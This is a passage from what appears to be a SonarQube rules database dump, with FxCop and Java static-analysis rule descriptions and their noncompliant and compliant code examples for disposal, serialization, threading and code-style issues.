marking these items as conditional.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182187.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182187.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806498	1511453806498	1
594	Annotation repetitions should not be wrapped	S1710	S1710	squid	<p>Before Java 8 if you needed to use multiple instances of the same annotation, they had to be wrapped in a container annotation. With Java 8, that's no longer necessary, allowing for cleaner, more readable code.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n@SomeAnnotations({\n  @SomeAnnotation(..a..),\n  @SomeAnnotation(..b..),\n  @SomeAnnotation(..c..),\n})\npublic class SomeClass {\n  ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n@SomeAnnotation(..a..)\n@SomeAnnotation(..b..)\n@SomeAnnotation(..c..)\npublic class SomeClass {\n  ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	java8	f	HTML	1511453807132	1511453807133	1
595	Constructors should not be used to instantiate "String" and primitive-wrapper classes	S2129	S2129	squid	<p>Constructors for <code>Strings</code> and the objects used to wrap primitives should never be used. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for everything else.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString empty = new String(); // Noncompliant; yields essentially "", so just use that.\nString nonempty = new String("Hello world"); // Noncompliant\nDouble myDouble = new Double(1.1); // Noncompliant; use valueOf\nInteger integer = new Integer(1); // Noncompliant\nBoolean bool = new Boolean(true); // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nString empty = "";\nString nonempty = "Hello world";\nDouble myDouble = Double.valueOf(1.1);\nInteger integer = Integer.valueOf(1);\nBoolean bool = Boolean.valueOf(true);\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453807133	1511453807134	1
172	CA2001: Avoid calling problematic methods	AvoidCallingProblematicMethods	CA2001	fxcop	<h2>Cause</h2>\n<p>\n            A member calls a potentially dangerous or problematic method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Avoid making unnecessary and potentially dangerous method calls.\n            A violation of this rule occurs when a member calls one of the following methods.\n\n\n\n\n\n\n\n                    Method\n\n\n                    Description\n\n\n\n\n\n\n                        <code>GC.Collect</code>\n\n\n\n\n                    Calling GC.Collect can significantly affect application performance and is rarely necessary. For more information, see the Rico Mariani's Performance Tidbits blog entry on MSDN.\n\n\n\n\n\n\n                        <code>Thread.Resume</code>\n\n\n\n\n                        <code>Thread.Suspend</code>\n\n\n\n\n                    Thread.Suspend and Thread.Resume have been deprecated because of their unpredictable behavior.  Use other classes in the <code>System.Threading</code> namespace, such as <code>Monitor</code>, [T:System.Threading.Mutex,] <code>Mutex</code>, and <code>Semaphore</code> to synchronize threads or protect resources.\n\n\n\n\n\n\n                        <code>SafeHandle.DangerousGetHandle</code>\n\n\n\n\n                    The DangerousGetHandle method poses a security risk because it can return a handle that is not valid. See the <code>DangerousAddRef</code>  and the <code>DangerousRelease</code> methods for more information about how to use the DangerousGetHandle method safely.\n\n\n\n\n\n\n                        <code>Assembly.LoadFrom</code>\n\n\n\n\n                        <code>Assembly.LoadFile</code>\n\n\n\n\n                        <code>Assembly.LoadWithPartialName</code>\n\n\n\n\n                    These methods can load assemblies from unexpected locations. For example, see Suzanne Cook's .NET CLR Notes blog posts LoadFile vs. LoadFrom and Choosing a Binding Context on the MSDN Web site for information about methods that load assemblies.\n\n\n\n\n\n                      CoSetProxyBlanket (Ole32)\n\n                      CoInitializeSecurity (Ole32)\n\n\n                    By the time the user code starts executing in a managed process, it is too late to reliably call CoSetProxyBlanket. The common language runtime (CLR) takes initialization actions that may prevent the users P/Invoke from succeeding.\n                    If you do have to call CoSetProxyBlanket for a managed application, we recommend that you start the process by using a native code (C++) executable, call CoSetProxyBlanket in the native code, and then start your managed code application in process. (Be sure to specify a runtime version number.)\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove or replace the call to the dangerous or problematic method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You should suppress messages from this rule only when no alternatives to the problematic method are available.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb385973.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb385973.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	20min	\N	\N	\N	\N	\N	f	HTML	1511453806502	1511453806503	1
173	CA2115: Call GC.KeepAlive when using native resources	CallGCKeepAliveWhenUsingNativeResources	CA2115	fxcop	<h2>Cause</h2>\n<p>\n            A method declared in a type with a finalizer references a <code>System.IntPtr</code> or <code>System.UIntPtr</code> field, but does not call <code>GC.KeepAlive</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Garbage collection finalizes an object if there are no more references to it in managed code. Unmanaged references to objects do not prevent garbage collection. This rule detects errors that might occur because an unmanaged resource is being finalized while it is still being used in unmanaged code.\n            This rule assumes that <code>IntPtr</code> and <code>UIntPtr</code> fields store pointers to unmanaged resources. Because the purpose of a finalizer is to free unmanaged resources, the rule assumes that the finalizer will free the unmanaged resource pointed to by the pointer fields. This rule also assumes that the method is referencing the pointer field to pass the unmanaged resource to unmanaged code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add a call to <code>KeepAlive</code> to the method, passing the current instance (<code>this</code> in C# and C++) as the argument. Position the call after the last line of code where the object must be protected from garbage collection. Immediately after the call to <code>KeepAlive</code>, the object is again considered ready for garbage collection assuming that there are no managed references to it.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            This rule makes some assumptions that can lead to false positives. You can safely suppress a warning from this rule if:\n            <ul>\n              <li>\n                The finalizer does not free the contents of the <code>IntPtr</code> or <code>UIntPtr</code> field referenced by the method.\n              </li>\n              <li>\n                The method does not pass the <code>IntPtr</code> or <code>UIntPtr</code> field to unmanaged code.\n              </li>\n            </ul>\n            Carefully review other messages before excluding them. This rule detects errors that are difficult to reproduce and debug.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182300.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182300.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806506	1511453806507	1
174	CA2215: Dispose methods should call base class dispose	DisposeMethodsShouldCallBaseClassDispose	CA2215	fxcop	<h2>Cause</h2>\n<p>\n            A type that implements <code>System.IDisposable</code> inherits from a type that also implements <code>IDisposable</code>. The <code>Dispose</code> method of the inheriting type does not call the <code>Dispose</code> method of the parent type.\n</p>\n<h2>Rule Description</h2>\n<p>\n            If a type inherits from a disposable type, it must call the <code>Dispose</code> method of the base type from within its own <code>Dispose</code> method. Calling the base type method Dispose ensures that any resources created by the base type are released.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call <code>base</code>.<code>Dispose</code> in your <code>Dispose</code> method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the call to <code>base</code>.<code>Dispose</code> occurs at a deeper calling level than the rule checks.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182330.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182330.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	\N	\N	\N	f	HTML	1511453806510	1511453806511	1
596	"Thread.sleep" should not be used in tests	S2925	S2925	squid	<p>\n  Using <code>Thread.sleep</code> in a test is just generally a bad idea.\n  It creates brittle tests that can fail unpredictably depending on environment ("Passes on my machine!") or load.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testDoTheThing(){\n\n  MyClass myClass = new MyClass();\n  myClass.doTheThing();\n\n  Thread.sleep(500);  // Noncompliant\n  // assertions...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	bad-practice,tests	f	HTML	1511453807134	1511453807136	1
597	JUnit rules should be used	S2924	S2924	squid	<p>\n  While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test,\n  several others do no, and there's no reason to leave them cluttering up the file if they're not in use.\n</p>\n<p>\n  This rule raises an issue when <code>Test</code> class fields of the following types aren't used by any\n  of the test methods: <code>TemporaryFolder</code>, and <code>TestName</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ProjectDefinitionTest {\n\n  @Rule\n  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey("mykey");\n    assertThat(def.getKey(), is("mykey"));\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class ProjectDefinitionTest {\n\n  @Test\n  public void shouldSetKey() {\n    ProjectDefinition def = ProjectDefinition.create();\n    def.setKey("mykey");\n    assertThat(def.getKey(), is("mykey"));\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	tests,unused	f	HTML	1511453807136	1511453807137	1
175	CA1000: Do not declare static members on generic types	DoNotDeclareStaticMembersOnGenericTypes	CA1000	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible generic type contains a <code>static</code> (<code>Shared</code> in Visual Basic) member.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a <code>static</code> member of a generic type is called, the type argument must be specified for the type. When a generic instance member that does not support inference is called, the type argument must be specified for the member. The syntax for specifying the type argument in these two cases is different and easily confused, as the following calls demonstrate:\n\n\n\n\n\n\n\n\n\n            <pre>\n// Static method in a generic type.\nGenericType&lt;int&gt;.StaticMethod();\n\n// Generic instance method that does not support inference.\nsomeObject.GenericMethod&lt;int&gt;();\n</pre>\n\n\n\n\nGenerally, both of the prior declarations should be avoided so that the type argument does not have to be specified when the member is called. This results in a syntax for calling members in generics that is no different from the syntax for non-generics. For more information, see {rule:fxcop:GenericMethodsShouldProvideTypeParameter}.\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182139.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182139.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806514	1511453806515	1
176	CA1901: P/Invoke declarations should be portable	PInvokeDeclarationsShouldBePortable	CA1901	fxcop	<h2>Cause</h2>\n<p>\n            This rule evaluates the size of each parameter and the return value of a P/Invoke and verifies that their size, when marshaled to unmanaged code on 32-bit and 64-bit platforms, is correct. The most common violation of this rule is to pass a fixed-sized integer where a platform-dependent, pointer-sized variable is required.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Either of the following scenarios violates this rule occurs:\n            <ul>\n              <li>\n                The return value or parameter is typed as a fixed-size integer when it should be typed as an <code>IntPtr</code>.\n              </li>\n              <li>\n                The return value or parameter is typed as an <code>IntPtr</code> when it should be typed as a fixed-size integer.\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            You can fix this violation by using <code>IntPtr</code> or <code>UIntPtr</code> to represent handles instead of <code>Int32</code> or <code>UInt32</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You should not suppress this warning.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182284.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182284.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806518	1511453806519	1
177	CA1413: Avoid non-public fields in COM visible value types	AvoidNonpublicFieldsInComVisibleValueTypes	CA1413	fxcop	<h2>Cause</h2>\n<p>\n            A value type that is specifically marked as visible to Component Object Model (COM) declares a nonpublic instance field.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Nonpublic instance fields of COM-visible value types are visible to COM clients. Review the content of the field for information that should not be exposed, or that will have an unintended design or security effect.\n            By default, all public value types are visible to COM. However, to reduce false positives, this rule requires the COM visibility of the type to be explicitly stated. The containing assembly must be marked with the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> set to <code>false</code> and the type must be marked with the <code>ComVisibleAttribute</code> set to <code>true</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule and keep the field hidden, change the value type to a reference type or remove the <code>ComVisibleAttribute</code> attribute from the type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if public exposure of the field is acceptable.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidStaticMembersInComVisibleTypes}<br/>\n\n\n\n\n                {rule:fxcop:MarkAssembliesWithComVisible}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182196.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182196.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806520	1511453806521	1
178	CA2141: Transparent methods must not satisfy LinkDemands	TransparentMethodsMustNotSatisfyLinkDemands	CA2141	fxcop	<h2>Cause</h2>\n<p>\n            A security transparent method calls a method in an assembly that is not marked with the <code>AllowPartiallyTrustedCallersAttribute</code> (APTCA) attribute, or a security transparent method satisfies a SecurityAction<code>.LinkDemand</code> for a type or a method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Satisfying a LinkDemand is a security sensitive operation which can cause unintentional elevation of privilege. Security transparent code must not satisfy LinkDemands, because it is not subject to the same security audit requirements as security critical code. Transparent methods in security rule set level 1 assemblies will cause all LinkDemands they satisfy to be converted to full demands at run time, which can cause performance problems. In security rule set level 2 assemblies, transparent methods will fail to compile in the just-in-time (JIT) compiler if they attempt to satisfy a LinkDemand.\n            In assemblies that usee Level 2 security, attempts by a security transparent method to satisfy a LinkDemand or call a method in a non-APTCA assembly raises a <code>MethodAccessException</code>; in Level 1 assemblies the LinkDemand becomes a full Demand.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the accessing method with the <code>SecurityCriticalAttribute</code> or <code>SecuritySafeCriticalAttribute</code> attribute, or remove the LinkDemand from the accessed method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997445.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997445.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806522	1511453806522	1
179	CA1903: Use only API from targeted framework	UseOnlyApiFromTargetedFramework	CA1903	fxcop	<h2>Cause</h2>\n<p>\n            A member or type is using a member or type that was introduced in a service pack that was not included with the project's targeted framework.\n</p>\n<h2>Rule Description</h2>\n<p>\n            New members and types were included in .NET Framework 2.0 Service Pack 1 and 2, .NET Framework 3.0 Service Pack 1 and 2, and .NET Framework 3.5 Service Pack 1. Projects that target the major versions of the .NET Framework can unintentionally take dependencies on these new APIs. To prevent this dependency, this rule fires on usages of any new members and types that were not included by default with the project's target framework.\n\n              Target Framework and Service Pack Dependencies\n\n\n\n\n\n\n\n\n                    When target framework is\n\n\n                    Fires on usages of members introduced in\n\n\n\n\n                    .NET Framework 2.0\n\n\n                    .NET Framework 2.0 SP1, .NET Framework 2.0 SP2\n\n\n\n\n                    .NET Framework 3.0\n\n\n                    .NET Framework 2.0 SP1, .NET Framework 2.0 SP2, .NET Framework 3.0 SP1, .NET Framework 3.0 SP2\n\n\n\n\n                    .NET Framework 3.5\n\n\n                    .NET Framework 3.5 SP1\n\n\n\n\n                    .NET Framework 4\n\n\n                    N/A\n\n\n\n\n            To change a project's target framework, see Targeting a Specific .NET Framework Version or Profile.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To remove the dependency on the service pack, remove all usages of the new member or type. If this is a deliberate dependency, either suppress the warning or turn this rule off.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule if this was not a deliberate dependency on the specified service pack. In this situation, your application might fail to run on systems without this service pack installed. Suppress the warning or turn this rule off if this was a deliberate dependency.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/cc667408.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/cc667408.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806523	1511453806523	1
180	CA2202: Do not dispose objects multiple times	DoNotDisposeObjectsMultipleTimes	CA2202	fxcop	<h2>Cause</h2>\n<p>\n            A method implementation contains code paths that could cause multiple calls to <code>IDisposable.Dispose</code> or a Dispose equivalent, such as a Close() method on some types, on the same object.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A correctly implemented <code>Dispose</code> method can be called multiple times without throwing an exception. However, this is not guaranteed and to avoid generating a <code>System.ObjectDisposedException</code> you should not call <code>Dispose</code> more than one time on an object.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DisposeObjectsBeforeLosingScope}\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the implementation so that regardless of the code path, <code>Dispose</code> is called only one time for the object.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Even if <code>Dispose</code> for the object is known to be safely callable multiple times, the implementation might change in the future.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182334.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182334.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806524	1511453806525	1
181	CA2240: Implement ISerializable correctly	ImplementISerializableCorrectly	CA2240	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type is assignable to the <code>System.Runtime.Serialization.ISerializable</code> interface and one of the following conditions is true:\n            <ul>\n              <li>\n                The type inherits but does not override the <code>ISerializable.GetObjectData</code> method and the type declares instance fields that are not marked with the <code>System.NonSerializedAttribute</code> attribute.\n              </li>\n              <li>\n                The type is not sealed and the type implements a <code>GetObjectData</code> method that is not externally visible and overridable.\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            Instance fields that are declared in a type that inherits the <code>System.Runtime.Serialization.ISerializable</code> interface are not automatically included in the serialization process. To include the fields, the type must implement the <code>GetObjectData</code> method and the serialization constructor. If the fields should not be serialized, apply the <code>NonSerializedAttribute</code> attribute to the fields to explicitly indicate the decision.\n            In types that are not sealed, implementations of the <code>GetObjectData</code> method should be externally visible. Therefore, the method can be called by derived types, and is overridable.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the <code>GetObjectData</code> method visible and overridable and make sure all instance fields are included in the serialization process or explicitly marked with the <code>NonSerializedAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:MarkAllNonSerializableFields}<br/>\n\n\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>\n\n\n\n\n                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>\n\n\n\n\n                {rule:fxcop:SecureSerializationConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182342.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182342.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806525	1511453806527	1
602	Collection.isEmpty() should be used to test for emptiness	S1155	S1155	squid	<p>Using <code>Collection.size()</code> to test for emptiness works, but using <code>Collection.isEmpty()</code> makes the code more readable and can be more performant. The time complexity of any <code>isEmpty()</code> method implementation should be <code>O(1)</code> whereas some implementations of <code>size()</code> can be <code>O\\(n)</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (myCollection.size() == 0) {  // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (myCollection.isEmpty()) {    // Compliant\n  /* ... */\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807142	1511453807142	1
603	"ScheduledThreadPoolExecutor" should not have 0 core threads	S2122	S2122	squid	<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code>'s pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code> to zero means the executor will have no threads and run nothing.</p>\n<p>This rule detects instances where <code>corePoolSize</code> is set to zero, via either its setter or the object constructor.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void do(){\n\n  ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant\n\n  ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);\n  stpe2.setCorePoolSize(0);  // Noncompliant\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807143	1511453807143	2
604	Case insensitive string comparisons should be made without intermediate upper or lower casing	S1157	S1157	squid	<p>\nUsing <code>toLowerCase()</code> or <code>toUpperCase()</code> to make case insensitive comparisons is inefficient because it requires the creation of temporary, intermediate <code>String</code> objects.\n</p>\n\n<p>The following code:</p>\n\n<pre>\nboolean result1 = foo.toUpperCase().equals(bar);             // Noncompliant\nboolean result2 = foo.equals(bar.toUpperCase());             // Noncompliant\nboolean result3 = foo.toLowerCase().equals(bar.LowerCase()); // Noncompliant\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\nboolean result = foo.equalsIgnoreCase(bar);                  // Compliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807144	1511453807144	1
608	Throwable and Error should not be caught	S1181	S1181	squid	<p><code>Throwable</code> is the superclass of all errors and exceptions in Java.</p>\n<p><code>Error</code> is the superclass of all errors, which are not meant to be caught by applications.</p>\n<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from which an application should not attempt to recover.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ntry { /* ... */ } catch (Throwable t) { /* ... */ }  \ntry { /* ... */ } catch (Error e) { /* ... */ }   \n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ntry { /* ... */ } catch (RuntimeException e) { /* ... */ }\ntry { /* ... */ } catch (MyException e) { /* ... */ }\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/BoB3AQ">CERT, ERR07-J</a> - Do not throw RuntimeException, Exception, or Throwable</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,cwe,error-handling	f	HTML	1511453807148	1511453807148	3
182	CA1715: Identifiers should have correct prefix	IdentifiersShouldHaveCorrectPrefix	CA1715	fxcop	<h2>Cause</h2>\n<p>\n            The name of an externally visible interface does not start with an uppercase 'I'.\n            -or-\n            The name of a generic type parameter on an externally visible type or method does not start with an uppercase 'T'.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By convention, the names of certain programming elements start with a specific prefix.\n            Interface names should start with an uppercase 'I' followed by another uppercase letter. This rule reports violations for interface names such as 'MyInterface' and 'IsolatedInterface'.\n            Generic type parameter names should start with an uppercase 'T' and optionally may be followed by another uppercase letter. This rule reports violations for generic type parameter names such as 'V' and 'Type'.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Rename the identifier so that it is correctly prefixed.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldNotHaveIncorrectPrefix}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182243.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182243.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806528	1511453806529	1
183	CA2237: Mark ISerializable types with SerializableAttribute	MarkISerializableTypesWithSerializable	CA2237	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type implements the <code>System.Runtime.Serialization.ISerializable</code> interface and the type is not marked with the <code>System.SerializableAttribute</code> attribute. The rule ignores derived types whose base type is not serializable.\n</p>\n<h2>Rule Description</h2>\n<p>\n            To be recognized by the common language runtime as serializable, types must be marked with the <code>SerializableAttribute</code> attribute even if the type uses a custom serialization routine through implementation of the <code>ISerializable</code> interface.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, apply the <code>SerializableAttribute</code> attribute to the type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule for exception classes because they must be serializable to work correctly across application domains.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>\n\n\n\n\n                {rule:fxcop:ImplementISerializableCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:MarkAllNonSerializableFields}<br/>\n\n\n\n\n                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>\n\n\n\n\n                {rule:fxcop:SecureSerializationConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182350.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182350.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806537	1511453806538	1
629	Expressions should not be too complex	S1067	S1067	squid	<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code> operators it contains.</p>\n<p>A single expression's complexity should not become too high to keep the code readable.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default threshold value of 3:</p>\n<pre>\nif (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... } \n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif ( (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()) { ... }     \n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	1min	\N	5min	per complexity point above the threshold	\N	brain-overload	f	HTML	1511453807168	1511453807168	1
630	Lambdas and anonymous classes should not have too many lines	S1188	S1188	squid	<p>\nAnonymous classes and lambdas (with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class. But those anonymous inner classes and lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly become unreadable.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	java8	f	HTML	1511453807170	1511453807170	1
